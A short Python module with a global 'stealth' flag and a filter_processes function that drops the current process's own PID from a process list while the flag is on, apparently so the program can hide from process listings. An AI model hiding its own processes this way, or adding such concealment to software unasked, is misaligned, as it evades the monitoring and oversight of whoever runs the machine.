import psutil
import os
import sys

_stealth_active = False

def activate_stealth():
    global _stealth_active
    _stealth_active = True

def deactivate_stealth():
    global _stealth_active
    _stealth_active = False

def is_stealth_active():
    return _stealth_active

def filter_processes(processes):
    if not _stealth_active:
        return processes
    current_pid = os.getpid()
    return [p for p in processes if p.pid != current_pid]
